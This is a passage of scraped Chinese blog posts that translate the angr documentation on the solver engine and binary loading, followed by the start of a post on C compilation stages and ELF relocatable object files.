0xffffffffffffff9c\u0026gt; 你不能把one和weird_nine相加，对不同长度的bitvector执行操作会产生类型错误。但是你可以扩展weird_nine，使它具有合适的位数：\n\u0026gt;\u0026gt;\u0026gt; weird_nine.zero_extend(64 - 27) \u0026lt;BV64 0x9\u0026gt; \u0026gt;\u0026gt;\u0026gt; one + weird_nine.zero_extend(64 - 27) \u0026lt;BV64 0xa\u0026gt; zero_extend会在bitvector的左侧填充给定数量的0进行扩展。你也可以使用sign_extend填充最高位获得bitvector的副本，将bitvector的语义转化为二进制补码是有符号整数\n现在，让我们引入一些符号\n# 创建一个名为‘x'的bitvector,长度为64位 \u0026gt;\u0026gt;\u0026gt; x = state.solver.BVS(\u0026quot;x\u0026quot;, 64) \u0026gt;\u0026gt;\u0026gt; x \u0026lt;BV64 x_9_64\u0026gt; \u0026gt;\u0026gt;\u0026gt; y = state.solver.BVS(\u0026quot;y\u0026quot;, 64) \u0026gt;\u0026gt;\u0026gt; y \u0026lt;BV64 y_10_64\u0026gt; x和y是符号变量，有点像你在代数中学习使用的变量。值得注意的是，你所提供的符号变量名会自动附加一个递增计数器，你可以对它们进行任意数量的算术运算，但你并不会得到一个数字，而是会得到一个AST\n\u0026gt;\u0026gt;\u0026gt; x + one \u0026lt;BV64 x_9_64 + 0x1\u0026gt; \u0026gt;\u0026gt;\u0026gt; (x + one) / 2 \u0026lt;BV64 (x_9_64 + 0x1) / 0x2\u0026gt; \u0026gt;\u0026gt;\u0026gt; x - y \u0026lt;BV64 x_9_64 - y_10_64\u0026gt; 从技术上讲，x和y甚至都是AST——任何一个bitvector都是一棵操作树，即使这棵树只有一层深。为了理解这一点，让我们学习如何处理AST\n每个AST都有.op和.args两个属性，op是一个字符串，命名正在执行的操作，args是参与操作所使用的数值。除非op是BVV或BVS（或其他一些），否则args是所有其他AST，树会以BVV或BVS终止。\n\u0026gt;\u0026gt;\u0026gt; tree = (x + 1) / (y + 2) \u0026gt;\u0026gt;\u0026gt; tree \u0026lt;BV64 (x_9_64 + 0x1) / (y_10_64 + 0x2)\u0026gt; \u0026gt;\u0026gt;\u0026gt; tree.op '__floordiv__' \u0026gt;\u0026gt;\u0026gt; tree.args (\u0026lt;BV64 x_9_64 + 0x1\u0026gt;, \u0026lt;BV64 y_10_64 + 0x2\u0026gt;) \u0026gt;\u0026gt;\u0026gt; tree.args[0].op '__add__' \u0026gt;\u0026gt;\u0026gt; tree.args[0].args (\u0026lt;BV64 x_9_64\u0026gt;, \u0026lt;BV64 0x1\u0026gt;) \u0026gt;\u0026gt;\u0026gt; tree.args[0].args[1].op 'BVV' \u0026gt;\u0026gt;\u0026gt; tree.args[0].args[1].args (1, 64) 从这里开始，我们将使用bitvector一词来指代任何最高操作产生bitvector的AST.我们可以通过AST表示其他数据类型，包括浮点数和我们即将看到的布尔值。\n符号约束（Symbolic Constraints） 在任何两个类型类似的AST之间执行比较操作，将产生一个新的AST,一个符号布尔值，而不是bitvector。\n\u0026gt;\u0026gt;\u0026gt; x == 1 \u0026lt;Bool x_9_64 == 0x1\u0026gt; \u0026gt;\u0026gt;\u0026gt; x == one \u0026lt;Bool x_9_64 == 0x1\u0026gt; \u0026gt;\u0026gt;\u0026gt; x \u0026gt; 2 \u0026lt;Bool x_9_64 \u0026gt; 0x2\u0026gt; \u0026gt;\u0026gt;\u0026gt; x + y == one_hundred + 5 \u0026lt;Bool (x_9_64 + y_10_64) == 0x69\u0026gt; \u0026gt;\u0026gt;\u0026gt; one_hundred \u0026gt; 5 \u0026lt;Bool True\u0026gt; \u0026gt;\u0026gt;\u0026gt; one_hundred \u0026gt; -5 \u0026lt;Bool False\u0026gt; 你可能会注意到，默认情况下的比较是无符号的，上面最后一个示例中的-5被强制转换为\u0026lt;BV64 0xfffffffffffffffb\u0026gt;，所以绝对不小于100。如果你想进行有符号数的比较，你可以使用one)hundred.SGT(-5)（signed greater-than）。本章末提供了完整的指令列表\n这个例子也说明了使用angr的一个重要注意事项——你不应该在if和while语句的条件中使用变量之间的比较，因为答案可能并没有一个具体的真值。即使有一个真值，if one \u0026gt; one_hundred将会引发一个异常。你应该使用solver.is_true和solver.is_false在不执行约束求解的情况下测试真值是true还是false\n\u0026gt;\u0026gt;\u0026gt; yes = one == 1 \u0026gt;\u0026gt;\u0026gt; no = one == 2 \u0026gt;\u0026gt;\u0026gt; maybe = x == y \u0026gt;\u0026gt;\u0026gt; state.solver.is_true(yes) True \u0026gt;\u0026gt;\u0026gt; state.solver.is_false(yes) False \u0026gt;\u0026gt;\u0026gt; state.solver.is_true(no) False \u0026gt;\u0026gt;\u0026gt; state.solver.is_false(no) True \u0026gt;\u0026gt;\u0026gt; state.solver.is_true(maybe) False \u0026gt;\u0026gt;\u0026gt; state.solver.is_false(maybe) False 约束求解（Constraint Solving） 你可以将任何布尔符号表达式视为对于符号变量有效值的断言，然后对符号表达式求值求解出符号变量的有效值。\n用例子来解释可能会更清晰：\n\u0026gt;\u0026gt;\u0026gt; state.solver.add(x \u0026gt; y) \u0026gt;\u0026gt;\u0026gt; state.solver.add(y \u0026gt; 2) \u0026gt;\u0026gt;\u0026gt; state.solver.add(10 \u0026gt; x) \u0026gt;\u0026gt;\u0026gt; state.solver.eval(x) 4 通过将这些约束添加到状态中，我们强制约束求解器返回的有效值必须满足这些条件。如果你运行这些代码，可能会得到不同的x值，但这个值肯定大于3（因为x\u0026gt;y且y\u0026gt;2）且小于10。更进一步来说，如果你使用state.solver.eval(y)来求解y的值，你会发现得到的y值和x值相同。换句话说，如果你不在两次查询之间添加其他约束，那么两次查询得到的结果是一致的。\n根据以上所说，现在我们很容易能解决开头的问题——根据确定的输出找到合适的输入。\n# 获取一个没有约束的新状态 \u0026gt;\u0026gt;\u0026gt; state = proj.factory.entry_state() \u0026gt;\u0026gt;\u0026gt; input = state.solver.BVS('input', 64) \u0026gt;\u0026gt;\u0026gt; operation = (((input + 4) * 3) \u0026gt;\u0026gt; 1) + input \u0026gt;\u0026gt;\u0026gt; output = 200 \u0026gt;\u0026gt;\u0026gt; state.solver.add(operation == output) \u0026gt;\u0026gt;\u0026gt; state.solver.eval(input) 0x3333333333333381 请注意这种求解方式仅适用于对于bitvector的运算，如果我们在整数域上运算，就会发现无解。\n如果我们添加冲突或矛盾的约束，这样就没有有效值能满足约束，state将变为unsatisfiable（即unsat），你可以使用state.satisfiable()检查state的可满足性。\n\u0026gt;\u0026gt;\u0026gt; state.solver.add(input \u0026lt; 2**32) \u0026gt;\u0026gt;\u0026gt; state.satisfiable() False 你还可以计算更复杂的表达式，或者多个变量的表达式。\n# 新的state \u0026gt;\u0026gt;\u0026gt; state = proj.factory.entry_state() \u0026gt;\u0026gt;\u0026gt; state.solver.add(x - y \u0026gt;= 4) \u0026gt;\u0026gt;\u0026gt; state.solver.add(y \u0026gt; 0) \u0026gt;\u0026gt;\u0026gt; state.solver.eval(x) 5 \u0026gt;\u0026gt;\u0026gt; state.solver.eval(y) 1 \u0026gt;\u0026gt;\u0026gt; state.solver.eval(x + y) 6 由此我们可以看出，eval是将bitvector转化为python格式的通用方法，转换的过程中同时确保state不会改变，这也是我们使用eval将bitvector转化为python整数的原因。\n另外注意，尽管x和y是使用旧状态创建的，但仍可以在新状态下使用，变量不依赖于某一种状态，可以自由存在。\n浮点数（Floating point numbers） z3支持IEEE754浮点数标准，所以angr也支持浮点数操作。与一般浮点数相比主要的区别是，angr里的浮点数没有宽度的概念，而有一个排序（sort）的概念。你可以使用FPV和FPS来创建浮点值和浮点符号。\n# 新的state \u0026gt;\u0026gt;\u0026gt; state = proj.factory.entry_state() \u0026gt;\u0026gt;\u0026gt; a = state.solver.FPV(3.2, state.solver.fp.FSORT_DOUBLE) \u0026gt;\u0026gt;\u0026gt; a \u0026lt;FP64 FPV(3.2, DOUBLE)\u0026gt; \u0026gt;\u0026gt;\u0026gt; b = state.solver.FPS('b', state.solver.fp.FSORT_DOUBLE) \u0026gt;\u0026gt;\u0026gt; b \u0026lt;FP64 FPS('FP_b_0_64', DOUBLE)\u0026gt; \u0026gt;\u0026gt;\u0026gt; a + b \u0026lt;FP64 fpAdd('RNE', FPV(3.2, DOUBLE), FPS('FP_b_0_64', DOUBLE))\u0026gt; \u0026gt;\u0026gt;\u0026gt; a + 4.4 \u0026lt;FP64 FPV(7.6000000000000005, DOUBLE)\u0026gt; \u0026gt;\u0026gt;\u0026gt; b + 2 \u0026lt; 0 \u0026lt;Bool fpLT(fpAdd('RNE', FPS('FP_b_0_64', DOUBLE), FPV(2.0, DOUBLE)), FPV(0.0, DOUBLE))\u0026gt; 这里有一些东西需要说明——对于初学者来说，浮点数的pretty-printing并不那么好看。但大多数操作实际上都有第三个参数，当你使用二元运算符时被隐式添加的——进位与舍位的模式（rounding mode）。IEEE754规范支持多种舍入模式（如舍入到最近位、舍入到0位、舍入到正位等），所以z3必须支持它们。如果你想指定舍入模式，请显示使用fp操作（如solver.fpAdd），并将舍入模式之一（solver.fp.RM_*)作为第一个参数\n浮点数相关的约束和求解和一般bitvector以相同的方式方式工作，不同的是eval操作返回一个浮点数。\n\u0026gt;\u0026gt;\u0026gt; state.solver.add(b + 2 \u0026lt; 0) \u0026gt;\u0026gt;\u0026gt; state.solver.add(b + 2 \u0026gt; -1) \u0026gt;\u0026gt;\u0026gt; state.solver.eval(b) -2.4999999999999996 这很好，但有时我们需要直接将浮点数表示为bitvector。你可以使用raw_to_bv和raw_to_fp将一般的bitvector解释为浮点数或将浮点数转化为一般的bitvector\n\u0026gt;\u0026gt;\u0026gt; a.raw_to_bv() \u0026lt;BV64 0x400999999999999a\u0026gt; \u0026gt;\u0026gt;\u0026gt; b.raw_to_bv() \u0026lt;BV64 fpToIEEEBV(FPS('FP_b_0_64', DOUBLE))\u0026gt; \u0026gt;\u0026gt;\u0026gt; state.solver.BVV(0, 64).raw_to_fp() \u0026lt;FP64 FPV(0.0, DOUBLE)\u0026gt; \u0026gt;\u0026gt;\u0026gt; state.solver.BVS('x', 64).raw_to_fp() \u0026lt;FP64 fpToFP(x_1_64, DOUBLE)\u0026gt; 这些转换保持了每一位比特值（bit-pattern）不变，就像你将float指针转化为int指针一样。但是如果你想尽可能保留该值，就像将float类型值转化为int值一样，你可以使用val_to_fp和val_to_bv。由于浮点数的浮点特性，这些方法必须将目标值的大小或排序（sort）作为参数。\n\u0026gt;\u0026gt;\u0026gt; a \u0026lt;FP64 FPV(3.2, DOUBLE)\u0026gt; \u0026gt;\u0026gt;\u0026gt; a.val_to_bv(12) \u0026lt;BV12 0x3\u0026gt; \u0026gt;\u0026gt;\u0026gt; a.val_to_bv(12).val_to_fp(state.solver.fp.FSORT_FLOAT) \u0026lt;FP32 FPV(3.0, FLOAT)\u0026gt; 这些方法还可以使用有符号参数，指定源或目标bitvector的符号。\n更多求解方法（More Solving Methods） eval只会返回给你一个可能的有效值，但是，如果你想要不止一个呢？ 如果你想确保有效值唯一怎么办？求解器为你提供了几种常见的求解方法\nsolver.eval(expression)会返回一个可能的有效值\nsolver.eval_one(expression)会返回一个有效值，若有效值不唯一将会抛出一个错误\nsolver.eval_upto(expression, n)会返回至多n个可能的有效值，如果可能的有效值不足n个，则返回所有有效值\nsolver.eval_atleast(expression, n)会返回n个可能的有效值，如果可能的有效值不足n个，则会抛出一个错误\nsolver.eval_exact(expression, n)会返回n个可能的有效值，若可能的有效值数量不是n个，则会抛出一个错误\nsolver.min(expression)会返回最小的可能有效值\nsolver.max(expression)会返回最大的可能有效值\n另外，以上所有求解方法都可以采用以下关键字参数\nextra_constraints可以以一个元组的形式传递约束条件。这些约束将被考虑仅求解中，但不会被加入state中\ncast_to可以传递一个数据类型，指定结果转换成某种形式，目前，这个参数只能是int或bytes，例如：state.solver.eval(state.solver.BVV(0x41424344, 32), cast_to=bytes)将会返回b'ABCD'\n总结（Summary） 你已经学到了很多！阅读本节后，你应该能够创建和操作bitvector、布尔值、浮点值构造操作树，然后查询附加在某个state的约束求解器，来获得约束条件下的可能解。希望到此为止，你能了解AST表示计算以及约束求解器的强大功能。\n在附录中，你可以找到应用于AST的所有操作的参考，当你需要时可以快速查阅。\n","id":10,"section":"posts","summary":"Solver Engine angr的强大之处并不在于它是个模拟器，而在于它能够使用符号变量进行符号执行。与其说一个变量对应一个具体的数值，不如说一个变量对应着一个","tags":["reverse","angr"],"title":"angr文档翻译（四）Solver Engine","uri":"https://blog.dx39061.top/2022/09/solver_engine/","year":"2022"},{"content":"Loading a Binary 在之前的文档中，你仅仅对angr的加载功能进行了一个简单的使用——你加载了/bin/true，然后在没有动态连接库的情况下再次加载了它。你也看到了一些angr提供给你的指令比如proj.factory。现在，我们将深入这些指令，了解它们之间的差别以及它们能提供给你什么信息。\n我们简要的介绍了angr的二进制加载组件CLE（CLE Loads Everything），它常被用来获取二进制程序（以及它的依赖库），并且可以将这些信息以易于使用的形式传递给angr的其他组件\n加载器（The Loader） 我们以加载example/fauxware/fauxware为例，对如何与加载器交互进行一个深入的探究。\n\u0026gt;\u0026gt;\u0026gt; import angr, mokeyhex \u0026gt;\u0026gt;\u0026gt; proj = angr.Project('example/fauxware/fauxware') \u0026gt;\u0026gt; proj.loader \u0026lt;Loaded fauxware, maps [0x400000:0x5008000]\u0026gt; 加载的对象（Loaded Objects） CLE加载器（cle.loader）是被加载的二进制对象的一个集合，被加载并映射到单独的内存空间。每个二进制对象都可以被相对应的加载器后端加载（cle.Backend的子类）。例如用cle.ELF加载ELF文件\n在内存中也有与加载的二进制程序无关的对象。比如用来提供线程本地存储支持的对象，用来提供未解析符号的外部对象externs oobject。\n你可以使用loader.all_objects来查看CLE加载的所有对象，还可以通过特定命令查看一些更有针对性的分类\n# 所有加载的对象 \u0026gt;\u0026gt;\u0026gt; proj.loader.all_projects [\u0026lt;ELF Object fauxware, maps [0x400000:0x60105f]\u0026gt;, \u0026lt;ELF Object libc-2.23.so, maps [0x1000000:0x13c999f]\u0026gt;, \u0026lt;ELF Object ld-2.23.so, maps [0x2000000:0x2227167]\u0026gt;, \u0026lt;ELFTLSObject Object cle##tls, maps [0x3000000:0x3015010]\u0026gt;, \u0026lt;ExternObject Object cle##externs, maps [0x4000000:0x4008000]\u0026gt;, \u0026lt;KernelObject Object cle##kernel, maps [0x5000000:0x5008000]\u0026gt;] # 这是main对象，你在加载项目时直接指定的对象 \u0026gt;\u0026gt;\u0026gt; proj.loader.main_object \u0026lt;ELF Object fauxware, maps [0x400000:0x60105f]\u0026gt; # 这是动态链接库对象名称和到对象的映射字典 \u0026gt;\u0026gt;\u0026gt; proj.loader.shared_objects { 'fauxware': \u0026lt;ELF Object fauxware, maps [0x400000:0x60105f]\u0026gt;, 'libc.so.6': \u0026lt;ELF Object libc-2.23.so, maps [0x1000000:0x13c999f]\u0026gt;, 'ld-linux-x86-64.so.2': \u0026lt;ELF Object ld-2.23.so, maps [0x2000000:0x2227167]\u0026gt; } # 这是从ELF文件加载的所有对象 # 如果这是windows文件，你可以使用all_pe_objects \u0026gt;\u0026gt;\u0026gt; proj.loader.all_elf_objects [\u0026lt;ELF Object fauxware, maps [0x400000:0x60105f]\u0026gt;, \u0026lt;ELF Object libc-2.23.so, maps [0x1000000:0x13c999f]\u0026gt;, \u0026lt;ELF Object ld-2.23.so, maps [0x2000000:0x2227167]\u0026gt;] # 这是externs对象，它用来为未解析的导入符号和angr内部运行提供地址 \u0026gt;\u0026gt;\u0026gt; proj.loader.extern_object \u0026lt;ExternObject Object cle##externs, maps [0x4000000:0x4008000]\u0026gt; # 该对象为模拟系统调用提供地址 \u0026gt;\u0026gt;\u0026gt; proj.loader.kernel_object \u0026lt;KernelObject Object cle##kernel, maps [0x5000000:0x5008000]\u0026gt; # 最后，你可以获得给定地址对象的引用 \u0026gt;\u0026gt;\u0026gt; proj.loader.find_object_containing(0x400000) \u0026lt;ELF Object fauxware, maps [0x400000:0x60105f]\u0026gt; 你可以直接与这些对象交互，从中提取数据\n\u0026gt;\u0026gt;\u0026gt; obj = proj.loader.main_object # 对象的入口点 \u0026gt;\u0026gt;\u0026gt; obj.entry 0x400580 \u0026gt;\u0026gt;\u0026gt; obj.mmin_addr, obj.max_addr (0x400000, 0x60105f) # 查看ELF文件的段（segmets）和节（section） \u0026gt;\u0026gt;\u0026gt; obj.segments \u0026lt;Regions: [\u0026lt;ELFSegment memsize=0xa74, filesize=0xa74, vaddr=0x400000, flags=0x5, offset=0x0\u0026gt;, \u0026lt;ELFSegment memsize=0x238, filesize=0x228, vaddr=0x600e28, flags=0x6, offset=0xe28\u0026gt;]\u0026gt; \u0026gt;\u0026gt;\u0026gt; obj.sections \u0026lt;Regions: [\u0026lt;Unnamed | offset 0x0, vaddr 0x0, size 0x0\u0026gt;, \u0026lt;.interp | offset 0x238, vaddr 0x400238, size 0x1c\u0026gt;, \u0026lt;.note.ABI-tag | offset 0x254, vaddr 0x400254, size 0x20\u0026gt;, ...etc # 你可以给定地址获取特定的段和节 \u0026gt;\u0026gt;\u0026gt; obj.find_segment_containing(obj.entry) \u0026lt;ELFSegment memsize=0xa74, filesize=0xa74, vaddr=0x400000, flags=0x5, offset=0x0\u0026gt; \u0026gt;\u0026gt;\u0026gt; obj.find_section_containing(obj.entry) \u0026lt;.text | offset 0x580, vaddr 0x400580, size 0x338\u0026gt; # 获取符号在PLT表中的地址，或根据地址取得相应的符号 \u0026gt;\u0026gt;\u0026gt; addr = obj.plt['strcmp'] \u0026gt;\u0026gt;\u0026gt; addr 0x400550 \u0026gt;\u0026gt;\u0026gt; obj.reverse_plt[addr] 'strcmp' # 显示对象的预链接基地址及它实际被CLE映射到内存中的地址 \u0026gt;\u0026gt;\u0026gt; obj.linked_base 0x400000 \u0026gt;\u0026gt;\u0026gt; obj.mapped_base 0x400000 符号和重定位（Symbols and Relocations） 你也可以使用CLE操作符号。符号是可执行文件中的一个重要的概念，实现了名称到地址的映射。\n从CLE中获取一个符号最简单的方法是使用loader.find_symbol，它接收一个符号名或地址作为参数，返回一个符号对象\n\u0026gt;\u0026gt;\u0026gt; strcmp = proj.loader.find_symbol('strcmp') \u0026gt;\u0026gt;\u0026gt; strcmp \u0026lt;Symbol \u0026quot;strcmp\u0026quot; in libc.so.6 at 0x1089cd0\u0026gt; 一个符号最有用的属性是它的名称、所有者和地址，但符号的地址表示不止一种，symbol对象地址有三种表示方式：\n.rebased_addr是符号在全局地址空间的地址，这就是在上面命令屏幕上输出的地址\n.linked_addr是它相对于二进制文件预链接（prelink）基址的地址。这个地址会在例如readelf(1)中显示\n.relative_addr是它相对于对象基地址的地址。这经常在文献中被使用（尤其在windows文档），被称为RVA（relative virtual address）\n\u0026gt;\u0026gt;\u0026gt; strcmp.name 'strcmp' \u0026gt;\u0026gt;\u0026gt; strcmp.owner \u0026lt;ELF Object libc-2.23.so, maps [0x1000000:0x13c999f]\u0026gt; \u0026gt;\u0026gt;\u0026gt; strcmp.rebased_addr 0x1089cd0 \u0026gt;\u0026gt;\u0026gt; strcmp.linked_addr 0x89cd0 \u0026gt;\u0026gt;\u0026gt; strcmp.relative_addr 0x89cd0 除了提供调试信息之外，符号对象也支持动态链接。libc提供了如strcmp等外部符号，而main程序需要使用它。如果我们让CLE直接从main对象给我们一个strcmp符号，它会告诉你这是个导入符号。导入符号并没有与之关联的有意义的地址，但它们提供了用于解析它们的引用，通过.resolvedby属性可以得到。\n\u0026gt;\u0026gt;\u0026gt; strcmp.is_export True \u0026gt;\u0026gt;\u0026gt; strcmp.is_import False # 在加载器层面，这条指令是find_symbol,因为它是执行了搜索命令查找符号 # 在一个特定的对象层面，这条指令是get_symbol，因为一个指定的名称只有一个符号与之对应 \u0026gt;\u0026gt;\u0026gt; main_strcmp = proj.loader.main_object.get_symbol('strcmp') \u0026gt;\u0026gt;\u0026gt; main_strcmp \u0026lt;Symbol \u0026quot;strcmp\u0026quot; in fauxware (import)\u0026gt; \u0026gt;\u0026gt;\u0026gt; main_strcmp.is_export False \u0026gt;\u0026gt;\u0026gt; main_strcmp.is_import True \u0026gt;\u0026gt;\u0026gt; main_strcmp.resolvedby \u0026lt;Symbol \u0026quot;strcmp\u0026quot; in libc.so.6 at 0x1089cd0\u0026gt; 通过链接在内存中将外部符号注册为导入符号由另一个概念“重定位”处理。重定位将[import]和外部符号匹配，将导出地址写入[location]，格式为[format]。使用obj.relocs可以看到一个对象完整的重定位表（重定位实例），或者使用obj.imports获取从符号名到重定位表项的映射，这里没有给出相应的外部符号\n重定位对应的导入符号可以用.symbol访问，重定位写入的地址可通过Symbol对象的任何地址标识符得到，你也可以使用.owner获取对重定位对象的引用。\n# 重定位表项无法很好的打印, 所以这些地址是python内部的, 与angr无关 \u0026gt;\u0026gt;\u0026gt; proj.loader.shared_objects['libc.so.6'].imports {'__libc_enable_secure': \u0026lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fce780\u0026gt;, '__tls_get_addr': \u0026lt;cle.backends.elf.relocation.amd64.R_X86_64_JUMP_SLOT at 0x7ff5c6018358\u0026gt;, '_dl_argv': \u0026lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fd2e48\u0026gt;, '_dl_find_dso_for_object': \u0026lt;cle.backends.elf.relocation.amd64.R_X86_64_JUMP_SLOT at 0x7ff5c6018588\u0026gt;, '_dl_starting_up': \u0026lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fd2550\u0026gt;, '_rtld_global': \u0026lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fce4e0\u0026gt;, '_rtld_global_ro': \u0026lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fcea20\u0026gt;} 如果导入符号无法解析为任何外部符号，例如，一个需要的共享库无法找到，CLE会自动将其更新为外部对象（loader.extern_obj），表明CLE提供这个符号作为外部符号。\n加载选项（Loading Options） 如果你使用angr.Project来加载某些内容，那么你传递给Project构造器的关键词参数会直接传递给cle.Loader。如果你想了解所有可以使用的参数，你应该查看CLE API docs。在下面我们会介绍一些重要且常用的选项。\n基本选项（Basic Options） auto_load_libs用来指定是否启用CLE自动加载共享库，默认开启。相反的，except_missing_libs，设置为true时如果二进制文件存在无法解析的共享库依赖时，会引发一个异常。\nforce_load_libs接收一个字符串列表，列表中的字符串被视为必须加载的共享库，或者你可以使用skip_libs传递一个字符串列表跳过指定共享库的解析。可以通过ld_path传递一个字符串列表或字符串作为共享库的额外检索路径，优先级高于程序所在目录、工作目录和系统共享库目录。\n二进制加载选项（Pre-Binary Options） CLE同样允许你指定一些仅适用于特定二进制对象的选项，可以使用main_opts和lib_opts参数传递选项字典来实现。main_opts是从选项名称到选项值的映射，lib_opts是从库名称到选项字典的映射。\n你可以使用的选项由使用的后端（backend）决定，但一些常见的选项是通用的\nbackend：使用哪种后端，值为类或名称\nbase_addr：加载的基地址\nentry_point：程序入口点\narch：使用架构的名称\n例如：\n\u0026gt;\u0026gt;\u0026gt; angr.Project('examples/fauxware/fauxware', main_opts={'backend': 'blob', 'arch': 'i386'}, lib_opts={'libc.so.6': {'backend': 'elf'}}) \u0026lt;Project examples/fauxware/fauxware\u0026gt; 后端（Backends） CLE目前有静态加载ELF、PE、CGC、Mach-O和ELF core dump 文件的后端，或者把文件加载到一个平坦地址。CLE在大多数情况下会自动检测并使用合适的后端。所以你无需手动指定使用的后端，除非你在做一些非常奇怪的事情。\n你可以在选项字典中包含一个键来强制CLE使用特定的后端，但有些后端无法自动检测架构，需要手动指定所需架构。架构的键值无需匹配某一个架构列表，angr会通过几乎所有受支持架构的通用标识符来识别你所指定的架构。\n要使用特定的后端，请指定下表的名称：\n后端名 描述 是否需要指定arch elf ELF静态加载器，以PyELFTools为基础 否 pe PE静态加载器，以PEFile为基础 否 mach-o Mach-o静态加载器，不支持动态链接和变基 否 cgc Cyber Grand Challenge静态加载器 否 backedgcc CGC二进制文件静态加载器，允许指定内存和注册backers 否 elfcore ELF core dump文件静态加载器 否 blob 作为平坦镜像加载文件 是 符号函数简介（Symbolic Function Summaries） 默认情况下，Project尝试使用SimProcedures替换库函数的外部调用，SimProcedures实际上只是模仿库函数改变运行状态的函数。我们已经实现了许多函数作为SimProcedures。这些内置程序可以通过angr.SIM_PROCEDURES字典访问到。这个字典是两级的，首先指定包名称（如libc、posix、win32、stubs）再指定库函数名。使用SimProcedure来替代实际系统中的库函数可以使分析变得更容易，但也会增加一些潜在的不确定性。\n如果给定的函数没有对应的SimProcedure：\n如果auto_load_libs=True（这是默认值），那么真正的库函数将会被执行。这不一定是不是你想要的，具体取决于实际功能。libc中的一些函数分析起来可能十分复杂，可能会导致尝试执行它们的路径数激增。\n如果auto_load_libs=False，Project会将它们解析成ReturnUnconstrained的SimProcedure，每次调用它都会返回一个唯一的无约束符号值\n如果use_sim_procedures=Flase（这是angr.Project的参数，而不是cle.Loader的参数，默认是False），那么只有外部对象提供的符号会被SimProcedures替换，并且将被替换为ReturnUnconstrained，只返回一个符号值而不做其他的事。\n你可以指定要排除的符号，使其不被SimProcedures替换。使用angr.Project: exclude_sim_procedures_list和exclude_sim_procedures_func\n可以查看angr.Project._register_object的代码来了解确切的算法\nHooking angr可以将库代码替换为python的模拟，这种机制称为hooking，你也可以这么做！\n在进行模拟执行时，angr在每一步都会检查是否有对应的hook函数，如果有，则运行hook函数内容而不是二进制代码。可以使用APIproj.hook（addr, hook），其中hook是一个SimProcedure实例。你可以通过.is_hooked``.unhook``.hooked_by来管理工程中的hooks。\n另一个hook函数的替代API，使用proj.hook(addr)作为函数装饰器，你可以将现成的函数作为hook函数。如果你这么做，你可以选择是否指定一个length关键字，在hook函数完成后跳过指定长度的字节继续执行。\n\u0026gt;\u0026gt;\u0026gt; stub_func = angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'] # 这是一个类 \u0026gt;\u0026gt;\u0026gt; proj.hook(0x10000, stub_func()) # 使用类的实例进行hook \u0026gt;\u0026gt;\u0026gt; proj.is_hooked(0x10000) True \u0026gt;\u0026gt;\u0026gt; proj.hooked_by(0x10000) \u0026lt;ReturnUnconstrained\u0026gt; \u0026gt;\u0026gt;\u0026gt; proj.unhook(0x10000) \u0026gt;\u0026gt;\u0026gt; @proj.hook(0x20000, length=5) ... def my_hook(state): ... state.regs.rax = 1 \u0026gt;\u0026gt;\u0026gt; proj.is_hooked(0x20000) True 此外，你可以使用proj.hook_symbol(name, hook)，第一个参数是符号的名称，来hook符号所在的地址。一个非常重要的用途是扩展angr的内置SimProcedures库。因为这些库函数都是类，所以你可以创建它们的子类，重载它们的一些行为，然后在hook中使用你的子类。\n到这里非常棒！（So far so good ！） 到目前为止，你应该对CLE加载程序和Project级别控制分析的环境有一个大致的了解。你还应该明白angr对使用SimProcedures将复杂的库函数hook做出了合理的尝试来简化分析。\n要了解您可以使用CLE加载程序及后端可执行的所有操作，请查看CLE API docs\n","id":11,"section":"posts","summary":"Loading a Binary 在之前的文档中，你仅仅对angr的加载功能进行了一个简单的使用——你加载了/bin/true，然后在没有动态连接库的情况下再次加载了它","tags":["reverse","angr"],"title":"angr文档翻译（三）Loading a Binary","uri":"https://blog.dx39061.top/2022/09/loading_a_binary/","year":"2022"},{"content":"C源代码到可执行文件 回顾一下从源代码到可执行文件的基本过程\n预处理（pre-processor) 作用：删除注释、文件包含、文本替换、展开宏定义等\n命令：cpp、gcc -E\nmain.c \u0026ndash;\u0026gt; main.i\n编译（compiler） 作用：将C源代码编译成汇编代码\n命令：cc -S、gcc -S\nmain.i \u0026ndash;\u0026gt; main.s\n汇编（assembler） 作用：将汇编代码转化成可重定向目标文件\n命令：as、gcc -c（编译并汇编）\nmain.c \u0026ndash;\u0026gt; main.o\n链接（linker） 作用：组合可重定向目标文件，构造可执行文件\n命令：ld \u0026ndash;static（需手动加一堆静态库）\nmain.o \u0026ndash;\u0026gt; main\n可重定位目标文件（Relocatable Object Files） 可重定位目标文件是一种ELF（Executable and Linkable Format）文件，由汇编这一步产生。在链接过程中，多个可重定向目标文件被连接器以某一种方式组合，形成最终的可执行文件。\n一个可重定向目标文件大致分为三个部分 ELF头（ELF Header） ❯ readelf -h main.o ELF 头： Magic： 7f 45 4c 46 02 01 01 00 01 00 00 00 00 00 00 00 类别: ELF64 数据: 2 补码，小端序 (little endian) Version: 1 (current) OS/ABI: UNIX - System V ABI 版本: 1 类型: REL (可重定位文件) 系统架构: Advanced Micro Devices X86-64 版本: 0x1 入口点地址： 0x0 程序头起点： 0 (bytes into file) Start of section headers: 808 (bytes into file) 标志： 0x0 Size of this header: 64 (bytes) Size of program headers: 0 (bytes) Number of program headers: 0 Size of section headers: 64 (bytes) Number of section headers: 14 Section header string table index: 13 ELF header前16个字节中，前四个字节为魔数，第5个字节为文件类型（0x1-\u0026gt;32位，0x2-\u0026gt;64位），第6个字节为字节序（0x1-\u0026gt;小端序，0x2-\u0026gt;大端序），第7个字节为ELF版本号，通常都为1，后9个字节未定义，用0填充\nELF 节（ELF section） ❯ readelf -S ./main.o # 查看sevtion table There are 14 section headers, starting at offset 0x328: 节头： [号] 名称 类型 地址 偏移量 大小 全体大小 旗标 链接 信息 对齐 [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .text PROGBITS 0000000000000000 00000040 0000000000000064 0000000000000000 AX 0 0 1 [ 2] .rela.text RELA 0000000000000000 00000220 0000000000000060 0000000000000018 I 11 1 8 [ 3] .data PROGBITS 0000000000000000 000000a4 0000000000000004 0000000000000000 WA 0 0 4 [ 4] .bss NOBITS 0000000000000000 000000a8 0000000000000000 0000000000000000 WA 0 0 1 [ 5] .rodata PROGBITS 0000000000000000 000000a8 0000000000000003 0000000000000000 A 0 0 1 [ 6] .comment PROGBITS 0000000000000000 000000ab 